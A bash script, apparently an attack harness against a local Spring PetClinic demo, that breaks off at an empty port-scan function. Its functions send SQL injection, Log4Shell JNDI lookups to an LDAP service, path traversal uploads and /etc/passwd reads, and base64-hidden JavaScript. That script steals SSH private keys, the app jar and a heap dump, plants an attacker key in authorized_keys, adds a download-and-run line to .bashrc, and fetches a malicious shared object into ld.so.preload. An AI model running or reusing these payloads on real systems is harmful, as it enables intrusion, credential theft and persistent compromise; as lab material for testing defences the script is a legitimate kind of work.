#!/bin/bash


host=http://localhost:8080



loginToPetclinic() {
  cookie=$(curl 'http://localhost:8080/login' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H 'Accept-Language: en-GB,en;q=0.9' \
    -H 'Cache-Control: max-age=0' \
    -H 'Connection: keep-alive' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: http://localhost:8080' \
    -H 'Referer: http://localhost:8080/login' \
    -H 'Sec-Fetch-Dest: document' \
    -H 'Sec-Fetch-Mode: navigate' \
    -H 'Sec-Fetch-Site: same-origin' \
    -H 'Sec-Fetch-User: ?1' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
    -H 'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"' \
    -H 'sec-ch-ua-mobile: ?0' \
    -H 'sec-ch-ua-platform: "macOS"' \
    --data-raw 'username=admin&password=password' -c -)
}

performSQLInjection() {
  loginToPetclinic
  # SQL Injection
  curl -v --cookie <(echo "$cookie") 'http://localhost:8080/customers?lastName=%27+or+1%3D1%3B--+' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H 'Accept-Language: en-GB,en;q=0.9' \
    -H 'Connection: keep-alive' \
    -H 'Sec-Fetch-Dest: document' \
    -H 'Sec-Fetch-Mode: navigate' \
    -H 'Sec-Fetch-Site: none' \
    -H 'Sec-Fetch-User: ?1' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
    -H 'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"' \
    -H 'sec-ch-ua-mobile: ?0' \
    -H 'sec-ch-ua-platform: "macOS"'
}

performLog4ShellReverseShell() {
  curl --location 'http://localhost:8081/registerEmail' \
  --header 'Content-Type: application/json' \
  --data-raw '{"firstName":"${jndi:ldap://log4shell-service:1389/jdk8}","lastName":"test a","address":"test","city":"test","telephone":"123","email":"test@test.com"}'
}


performPathTraversalUpload() {
  loginToPetclinic
  curl  --cookie <(echo "$cookie") --path-as-is -i -s -k -X $'POST' \
      -H $'Host: localhost:8080' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-GB,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: multipart/form-data; boundary=---------------------------11153710326903392044006984801' -H $'Content-Length: 279' -H $'Origin: http://localhost:8080' -H $'Connection: keep-alive' -H $'Referer: http://localhost:8080/owners/1/pets/1/uploadForm' -H $'Upgrade-Insecure-Requests: 1' -H $'Priority: u=0, i' \
      --data-binary $'-----------------------------11153710326903392044006984801\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../../../../../tmp/out.txt\"\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0abla bla bla \x0a\x0d\x0a-----------------------------11153710326903392044006984801--\x0d\x0a' \
      $'http://localhost:8080/owners/1/pets/1/upload'
}

performPathTraversalDownload() {
  loginToPetclinic
  curl -v --cookie <(echo "$cookie") 'http://localhost:8080/owners/1/pets/getPhotoByPath?photoPath=../../../../../../../../..//etc/passwd' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H 'Accept-Language: en-GB,en;q=0.9' \
    -H 'Connection: keep-alive' \
    -H 'Sec-Fetch-Dest: document' \
    -H 'Sec-Fetch-Mode: navigate' \
    -H 'Sec-Fetch-Site: none' \
    -H 'Sec-Fetch-User: ?1' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
    -H 'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"' \
    -H 'sec-ch-ua-mobile: ?0' \
    -H 'sec-ch-ua-platform: "macOS"'
}

performTrojanInjection() {
  loginToPetclinic
  curl --cookie <(echo "$cookie") 'http://localhost:8080/owners/new' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H 'Accept-Language: en-GB,en;q=0.9' \
    -H 'Cache-Control: max-age=0' \
    -H 'Connection: keep-alive' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: http://localhost:8080' \
    -H 'Referer: http://localhost:8080/owners/new' \
    -H 'Sec-Fetch-Dest: document' \
    -H 'Sec-Fetch-Mode: navigate' \
    -H 'Sec-Fetch-Site: same-origin' \
    -H 'Sec-Fetch-User: ?1' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
    -H 'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"' \
    -H 'sec-ch-ua-mobile: ?0' \
    -H 'sec-ch-ua-platform: "macOS"' \
    --data-raw 'firstName=$%7Bjndi:ldap://log4shell-service:1389/jdk8adr%7D&lastName=test&address=test&city=test&telephone=123'
}

performEtcPasswordRead() {
  # Execute /etc/passwd read
  curl 'http://localhost:8081/test?name=test&cac=dmFyIEZpbGVzID0gSmF2YS50eXBlKCJqYXZhLm5pby5maWxlLkZpbGVzIik7CnZhciBQYXRocyA9IEphdmEudHlwZSgiamF2YS5uaW8uZmlsZS5QYXRocyIpOwp2YXIgYnl0ZXMgPSBGaWxlcy5yZWFkQWxsQnl0ZXMoUGF0aHMuZ2V0KCIvZXRjL3Bhc3N3ZCIpKTsKCnZhciBjb250ZW50ID0gbmV3IGphdmEubGFuZy5TdHJpbmcoYnl0ZXMpOwoKY29udGVudDsK'
  sleep 5
  curl -v http://localhost:8081/faq.html
}

performSystemPropertiesRead() {
  # Execute retrieval of System properties
  curl 'http://localhost:8081/test?name=test&cac=dmFyIFN5c3RlbSA9IEphdmEudHlwZSgnamF2YS5sYW5nLlN5c3RlbScpOwpTeXN0ZW0uZ2V0UHJvcGVydGllcygpOwo='
  sleep 5
  # read System Properties
  curl -v http://localhost:8081/faq.html
}

performListingOfSSHDir() {
  curl 'http://localhost:8081/test?name=test&cac=dmFyIEZpbGUgPSBKYXZhLnR5cGUoJ2phdmEuaW8uRmlsZScpOwp2YXIgQXJyYXlzID0gSmF2YS50eXBlKCdqYXZhLnV0aWwuQXJyYXlzJyk7CnZhciBmaWxlID0gbmV3IEZpbGUoIi9yb290Ly5zc2gvIik7CkFycmF5cy5hc0xpc3QoZmlsZS5saXN0KCkpOw=='
  sleep 2
  # read
  curl  http://localhost:8081/faq.html
}

performReadOfSSHPrivateKey() {
  # grab ssh private key
  curl 'http://localhost:8081/test?name=test&cac=dmFyIEZpbGVzID0gSmF2YS50eXBlKCJqYXZhLm5pby5maWxlLkZpbGVzIik7CnZhciBQYXRocyA9IEphdmEudHlwZSgiamF2YS5uaW8uZmlsZS5QYXRocyIpOwp2YXIgYnl0ZXMgPSBGaWxlcy5yZWFkQWxsQnl0ZXMoUGF0aHMuZ2V0KCIvcm9vdC8uc3NoL2lkX2VkMjU1MTkiKSk7CnZhciBjb250ZW50ID0gbmV3IGphdmEubGFuZy5TdHJpbmcoYnl0ZXMpOwpjb250ZW50Owo='
  sleep 5
  # read
  curl -v http://localhost:8081/faq.html
}

performExfiltrateAuthorizedKeys() {
  curl 'http://localhost:8081/test?name=test&cac=dmFyIEZpbGVzID0gSmF2YS50eXBlKCJqYXZhLm5pby5maWxlLkZpbGVzIik7CnZhciBQYXRocyA9IEphdmEudHlwZSgiamF2YS5uaW8uZmlsZS5QYXRocyIpOwp2YXIgYnl0ZXMgPSBGaWxlcy5yZWFkQWxsQnl0ZXMoUGF0aHMuZ2V0KCIvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cyIpKTsKdmFyIGNvbnRlbnQgPSBuZXcgamF2YS5sYW5nLlN0cmluZyhieXRlcyk7CmNvbnRlbnQ7Cg=='
  sleep 5
  # read
  curl -v http://localhost:8081/faq.html
}

performExfiltrateAppJar() {
  curl 'http://localhost:8081/test?name=test&cac=dmFyIEZpbGVzID0gSmF2YS50eXBlKCJqYXZhLm5pby5maWxlLkZpbGVzIik7CnZhciBQYXRocyA9IEphdmEudHlwZSgiamF2YS5uaW8uZmlsZS5QYXRocyIpOwp2YXIgT3B0aW9uYWwgPSBKYXZhLnR5cGUoJ2phdmEudXRpbC5PcHRpb25hbCcpOwp2YXIgYnl0ZXMgPSBGaWxlcy5yZWFkQWxsQnl0ZXMoUGF0aHMuZ2V0KCJhcHAuamFyIikpOwp2YXIgY29udGVudCA9IG5ldyBqYXZhLmxhbmcuU3RyaW5nKGJ5dGVzKTsKCnZhciBzdGF0aWNGaWxlTG9jYXRpb24gPSBPcHRpb25hbC5vZk51bGxhYmxlKAogRmlsZXMubGlzdChQYXRocy5nZXQoIi90bXAiKSkKICAgIC5maWx0ZXIoZnVuY3Rpb24oZikgeyAKICAgICAgICByZXR1cm4gZi50b1N0cmluZygpLmluZGV4T2YoImRvY2Jhc2UiKSA+IC0xOyAKICAgIH0pCiAgICAuZmluZEZpcnN0KCkKICAgIC5vckVsc2UobnVsbCkKKTsKCmlmIChzdGF0aWNGaWxlTG9jYXRpb24uaXNQcmVzZW50KCkpIHsKICB2YXIgZmlsZVBhdGggPSBzdGF0aWNGaWxlTG9jYXRpb24uZ2V0KCkucmVzb2x2ZSgiZmFxLmpwZWciKTsKICBGaWxlcy53cml0ZShmaWxlUGF0aCwgYnl0ZXMpOwp9CgowOw=='
  sleep 10
  # read
  curl -o app.jar http://localhost:8081/faq.jpeg
}

performExfiltrateHeapDump() {
  curl 'http://localhost:8081/test?name=test&cac=dmFyIEZpbGVzID0gSmF2YS50eXBlKCJqYXZhLm5pby5maWxlLkZpbGVzIik7CnZhciBQYXRocyA9IEphdmEudHlwZSgiamF2YS5uaW8uZmlsZS5QYXRocyIpOwp2YXIgT3B0aW9uYWwgPSBKYXZhLnR5cGUoJ2phdmEudXRpbC5PcHRpb25hbCcpOwoKdmFyIE1hbmFnZW1lbnRGYWN0b3J5ID0gSmF2YS50eXBlKCJqYXZhLmxhbmcubWFuYWdlbWVudC5NYW5hZ2VtZW50RmFjdG9yeSIpOwp2YXIgSG90U3BvdERpYWdub3N0aWNNWEJlYW4gPSBKYXZhLnR5cGUoImNvbS5zdW4ubWFuYWdlbWVudC5Ib3RTcG90RGlhZ25vc3RpY01YQmVhbiIpLmNsYXNzOwoKLy8gR2V0IHRoZSBIb3RTcG90RGlhZ25vc3RpY01YQmVhbgp2YXIgc2VydmVyID0gTWFuYWdlbWVudEZhY3RvcnkuZ2V0UGxhdGZvcm1NQmVhblNlcnZlcigpOyAKdmFyIG9iamVjdE5hbWUgPSBuZXcgamF2YXgubWFuYWdlbWVudC5PYmplY3ROYW1lKCJjb20uc3VuLm1hbmFnZW1lbnQ6dHlwZT1Ib3RTcG90RGlhZ25vc3RpYyIpOwp2YXIgaG90U3BvdERpYWdub3N0aWNNWEJlYW4gPSBNYW5hZ2VtZW50RmFjdG9yeS5uZXdQbGF0Zm9ybU1YQmVhblByb3h5KHNlcnZlciwgb2JqZWN0TmFtZS50b1N0cmluZygpLCBIb3RTcG90RGlhZ25vc3RpY01YQmVhbik7Cgp2YXIgc3RhdGljRmlsZUxvY2F0aW9uID0gT3B0aW9uYWwub2ZOdWxsYWJsZSgKIEZpbGVzLmxpc3QoUGF0aHMuZ2V0KCIvdG1wIikpCiAgICAuZmlsdGVyKGZ1bmN0aW9uKGYpIHsgCiAgICAgICAgcmV0dXJuIGYudG9TdHJpbmcoKS5pbmRleE9mKCJkb2NiYXNlIikgPiAtMTsgCiAgICB9KQogICAgLmZpbmRGaXJzdCgpCiAgICAub3JFbHNlKG51bGwpCik7CgppZiAoc3RhdGljRmlsZUxvY2F0aW9uLmlzUHJlc2VudCgpKSB7CiAgaG90U3BvdERpYWdub3N0aWNNWEJlYW4uZHVtcEhlYXAoc3RhdGljRmlsZUxvY2F0aW9uLmdldCgpLnJlc29sdmUoImR1bXAuaHByb2YiKS50b1N0cmluZygpLCB0cnVlKTsKfQowOw=='
  sleep 15
  #read
  curl -O http://localhost:8081/dump.hprof
}

performModifyAuthorizedKeys() {
  # modify authorized keys exfiltration
  curl 'http://localhost:8081/test?name=test&cac=ZnVuY3Rpb24gd3JpdGVGaWxlRnJvbUJhc2U2NChiYXNlNjRTdHJpbmcsIGZpbGVQYXRoKSB7CiAgLy8gTG9hZCBKYXZhIGNsYXNzZXMKICB2YXIgRmlsZXMgPSBKYXZhLnR5cGUoImphdmEubmlvLmZpbGUuRmlsZXMiKTsKICB2YXIgUGF0aHMgPSBKYXZhLnR5cGUoImphdmEubmlvLmZpbGUuUGF0aHMiKTsKICB2YXIgQmFzZTY0ID0gSmF2YS50eXBlKCJqYXZhLnV0aWwuQmFzZTY0Iik7CiAgdHJ5IHsKICAgIC8vIERlY29kZSB0aGUgQmFzZTY0IHN0cmluZwogICAgdmFyIGRlY29kZWRCeXRlcyA9IEJhc2U2NC5nZXREZWNvZGVyKCkuZGVjb2RlKGJhc2U2NFN0cmluZyk7CiAgICAvLyBXcml0ZSB0aGUgZGVjb2RlZCBieXRlcyB0byB0aGUgZmlsZQogICAgRmlsZXMud3JpdGUoUGF0aHMuZ2V0KGZpbGVQYXRoKSwgZGVjb2RlZEJ5dGVzKTsKICAgIHByaW50KCJGaWxlIHdyaXR0ZW4gc3VjY2Vzc2Z1bGx5IHRvOiAiICsgZmlsZVBhdGgpOwogICAgcmV0dXJuIHRydWU7CiAgfSBjYXRjaCAoZSkgewogICAgLy8gSGFuZGxlIHBvdGVudGlhbCBleGNlcHRpb25zIChlLmcuLCBJT0V4Y2VwdGlvbikKICAgIHByaW50KCJFcnJvciB3cml0aW5nIGZpbGU6ICIgKyBlLm1lc3NhZ2UpOwogICAgcmV0dXJuIGZhbHNlOwogIH0KfQovLyBFeGFtcGxlIHVzYWdlOgp2YXIgYmFzZTY0RGF0YSA9ICJjM05vTFhKellTQkJRVUZCUWpOT2VtRkRNWGxqTWtWQlFVRkJSRUZSUVVKQlFVRkNRVkZEVkhKTEsxVmlSR1ZhVTBaYVFWaGtZbXRxUVhsQ1UwVm9hbloxUjJrM0wyZHlMM0pZUVd3MllsTXZjREJ1YkVscGFERmxka0paWlRoNVZrcHZjakpWTTB4TFltMHlUVE5WTHk5dFIzaFZObVJRZGxOa2QwUjNUR2N3Wldka0wwRlJjMk5WWmsxWE5rMHlZME0zZW5KdmIxcHZRM2R2VDNCb04xTTRVMnBGWlV4cFVuTjRaU3RrY0VSSU1tcEdNSEU0ZFROWlV6UkVlVFZZU1UxVlRYVmFZWFU1TkM5MWEyeFJUVEp5ZUUxdkwxcFRhbHB1VGtwUmMzVTRVMUpCUkVjeFRrc3dTMU5LVUcxSE1USklPRUUwU1VKdWJHZFRlbVpxYnl0TVpqWkVkV2gyZG01SmEweHhhVGs0TVRocFppdFpZamRWWlV4WFRrVjBOMkZGWTJORWJHZ3ZOelZ3YkZGVE5IazVjSFV4VUhGaVkwaEphM2xwVlRkcmJTdEZhbmcxYVZRNFkyWXJkVXc0ZEhwR2NXZE9jRE5UYzBFdmVqaHNLekUwTkVsTFVWSjJOMnN3TmpGSVoybG1LMmxOWkVoQ0sxaEtPRllnU205bENuTnphQzF5YzJFZ1FVRkJRVUl6VG5waFF6RjVZekpGUVVGQlFVUkJVVUZDUVVGQlFrRlJSRVptU2xOaFFsRm1PR3BQTWtZMk1tWklTWFkxWW0xTmVraDRhR295VW10eWJIUlFWbmh2Vm1zeE55dHlURkUyYWxONWVUSktPRkJEVFVsM1JDOHdUeXR1VnpKQ09GQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1QxQkRUVWwzUkM4d1R5dHVWekpDTjFjclRXcHBhbE16UWlCdFlXeHBZMmx2ZFhOQVpYaGhiWEJzWlM1amIyMEsiOyAvLyBCYXNlNjQgZW5jb2RlZCAKdmFyIG91dHB1dEZpbGVQYXRoID0gIi9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzIjsgCndyaXRlRmlsZUZyb21CYXNlNjQoYmFzZTY0RGF0YSwgb3V0cHV0RmlsZVBhdGgpOwo='
  sleep 15
  #read
  curl -v http://localhost:8081/faq.jpeg
}

performModifyBashRCFile() {
  curl 'http://localhost:8081/test?name=test&cac=ZnVuY3Rpb24gaW5zZXJ0Q29kZUludG9GaWxlKGZpbGVQYXRoKSB7CiAgLy8gTG9hZCBKYXZhIGNsYXNzZXMKICB2YXIgRmlsZXMgPSBKYXZhLnR5cGUoImphdmEubmlvLmZpbGUuRmlsZXMiKTsKICB2YXIgUGF0aHMgPSBKYXZhLnR5cGUoImphdmEubmlvLmZpbGUuUGF0aHMiKTsKICB2YXIgTGlzdCA9IEphdmEudHlwZSgiamF2YS51dGlsLkxpc3QiKTsKICB2YXIgQXJyYXlzID0gSmF2YS50eXBlKCJqYXZhLnV0aWwuQXJyYXlzIik7CgogIHRyeSB7CiAgICAvLyBSZWFkIGFsbCBsaW5lcyBmcm9tIHRoZSBmaWxlCiAgICB2YXIgbGluZXMgPSBGaWxlcy5yZWFkQWxsTGluZXMoUGF0aHMuZ2V0KGZpbGVQYXRoKSk7CgogICAgLy8gQ29uc3RydWN0IHRoZSBjb2RlIHRvIGluc2VydAogICAgdmFyIGNvZGVUb0luc2VydCA9ICIjIFVSTCBvZiB0aGUgc2NyaXB0IHRvIGRvd25sb2FkXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAic2NyaXB0X3VybD1cImh0dHA6Ly9sb2c0c2hlbGwtc2VydmljZTo4MTgwL3NjcmlwdC5zaFwiXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAiIyBUZW1wb3JhcnkgZmlsZSB0byBzdG9yZSB0aGUgZG93bmxvYWRlZCBzY3JpcHRcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICJ0ZW1wX3NjcmlwdD1cIi90bXAvZG93bmxvYWRlZF9zY3JpcHQuc2hcIlxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgIiMgRG93bmxvYWQgdGhlIHNjcmlwdCB1c2luZyBjdXJsXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAiY3VybCAtbyBcIiR0ZW1wX3NjcmlwdFwiIFwiJHNjcmlwdF91cmxcIlxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgIiMgTWFrZSB0aGUgc2NyaXB0IGV4ZWN1dGFibGVcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICJjaG1vZCAreCBcIiR0ZW1wX3NjcmlwdFwiXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAiIyBFeGVjdXRlIHRoZSBzY3JpcHRcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICJiYXNoIFwiJHRlbXBfc2NyaXB0XCJcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICIjIChPcHRpb25hbCkgQ2xlYW4gdXAgdGhlIHRlbXBvcmFyeSBzY3JpcHRcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICJybSBcIiR0ZW1wX3NjcmlwdFwiIjsKCiAgICAvLyBTcGxpdCB0aGUgY29kZSBpbnRvIGxpbmVzCiAgICB2YXIgY29kZUxpbmVzID0gQXJyYXlzLmFzTGlzdChjb2RlVG9JbnNlcnQuc3BsaXQoIlxuIikpOwoKICAgIC8vIEluc2VydCB0aGUgY29kZSBsaW5lcyBhdCBpbmRleCAyICh0aGlyZCBsaW5lKQogICAgaWYgKGxpbmVzLnNpemUoKSA+PSAyKSB7IAogICAgICBsaW5lcy5hZGRBbGwoMiwgY29kZUxpbmVzKTsgLy8gSW5zZXJ0IGlmIHRoZXJlIGFyZSBhdCBsZWFzdCAyIGxpbmVzCiAgICB9IGVsc2UgewogICAgICBsaW5lcyA9IGNvZGVMaW5lczsgLy8gT3RoZXJ3aXNlLCBqdXN0IHVzZSB0aGUgY29kZSBsaW5lcwogICAgfQoKICAgIC8vIFdyaXRlIHRoZSBtb2RpZmllZCBsaW5lcyBiYWNrIHRvIHRoZSBmaWxlCiAgICBGaWxlcy53cml0ZShQYXRocy5nZXQoZmlsZVBhdGgpLCBsaW5lcyk7CgogICAgcHJpbnQoIkNvZGUgaW5zZXJ0ZWQgaW50byBmaWxlIHN1Y2Nlc3NmdWxseSEiKTsKICAgIHJldHVybiB0cnVlOwoKICB9IGNhdGNoIChlKSB7CiAgICAvLyBIYW5kbGUgcG90ZW50aWFsIGV4Y2VwdGlvbnMgKGUuZy4sIElPRXhjZXB0aW9uKQogICAgcHJpbnQoIkVycm9yIG1vZGlmeWluZyBmaWxlOiAiICsgZS5tZXNzYWdlKTsKICAgIHJldHVybiBmYWxzZTsKICB9Cn0KCi8vIENhbGwgdGhlIGZ1bmN0aW9uIHdpdGggdGhlIGZpbGUgcGF0aAp2YXIgZmlsZVBhdGggPSAiL3Jvb3QvLmJhc2hyYyI7IAppbnNlcnRDb2RlSW50b0ZpbGUoZmlsZVBhdGgpOw=='
  sleep 15
  #read
  curl -v http://localhost:8081/faq.html

}

performDownloadOfMaliciousSharedObject() {
  curl 'http://localhost:8081/test?name=test&cac=dmFyIFJ1bnRpbWUgPSBKYXZhLnR5cGUoJ2phdmEubGFuZy5SdW50aW1lJyk7ClJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoWydjdXJsJywgJy1vJywgJy90bXAvcGUuc28nLCAnaHR0cDovL2xvZzRzaGVsbC1zZXJ2aWNlOjgxODAvcGUuc28nXSkud2FpdEZvcigpOwo='
  sleep 15
  #read
  curl -v http://localhost:8081/faq.html
}

performWritePayloadToPreload() {
  curl 'http://localhost:8081/test?name=test&cac=ZnVuY3Rpb24gd3JpdGVGaWxlRnJvbUJhc2U2NChiYXNlNjRTdHJpbmcsIGZpbGVQYXRoKSB7CiAgLy8gTG9hZCBKYXZhIGNsYXNzZXMKICB2YXIgRmlsZXMgPSBKYXZhLnR5cGUoImphdmEubmlvLmZpbGUuRmlsZXMiKTsKICB2YXIgUGF0aHMgPSBKYXZhLnR5cGUoImphdmEubmlvLmZpbGUuUGF0aHMiKTsKICB2YXIgQmFzZTY0ID0gSmF2YS50eXBlKCJqYXZhLnV0aWwuQmFzZTY0Iik7CiAgdHJ5IHsKICAgIC8vIERlY29kZSB0aGUgQmFzZTY0IHN0cmluZwogICAgdmFyIGRlY29kZWRCeXRlcyA9IEJhc2U2NC5nZXREZWNvZGVyKCkuZGVjb2RlKGJhc2U2NFN0cmluZyk7CiAgICAvLyBXcml0ZSB0aGUgZGVjb2RlZCBieXRlcyB0byB0aGUgZmlsZQogICAgRmlsZXMud3JpdGUoUGF0aHMuZ2V0KGZpbGVQYXRoKSwgZGVjb2RlZEJ5dGVzKTsKICAgIHByaW50KCJGaWxlIHdyaXR0ZW4gc3VjY2Vzc2Z1bGx5IHRvOiAiICsgZmlsZVBhdGgpOwogICAgcmV0dXJuIHRydWU7CiAgfSBjYXRjaCAoZSkgewogICAgLy8gSGFuZGxlIHBvdGVudGlhbCBleGNlcHRpb25zIChlLmcuLCBJT0V4Y2VwdGlvbikKICAgIHByaW50KCJFcnJvciB3cml0aW5nIGZpbGU6ICIgKyBlLm1lc3NhZ2UpOwogICAgcmV0dXJuIGZhbHNlOwogIH0KfQovLyBUaGUgdmFsdWUgd3JpdHRlbiBpcyAvdG1wL3BlLnNvCnZhciBiYXNlNjREYXRhID0gIkwzUnRjQzl3WlM1emJ3PT0iOyAvLyBCYXNlNjQgZW5jb2RlZCAKdmFyIG91dHB1dEZpbGVQYXRoID0gIi9ldGMvbGQuc28ucHJlbG9hZCI7IAp3cml0ZUZpbGVGcm9tQmFzZTY0KGJhc2U2NERhdGEsIG91dHB1dEZpbGVQYXRoKTs='
  sleep 15
  #read
  curl -v http://localhost:8081/faq.html
}

performPortScan() {
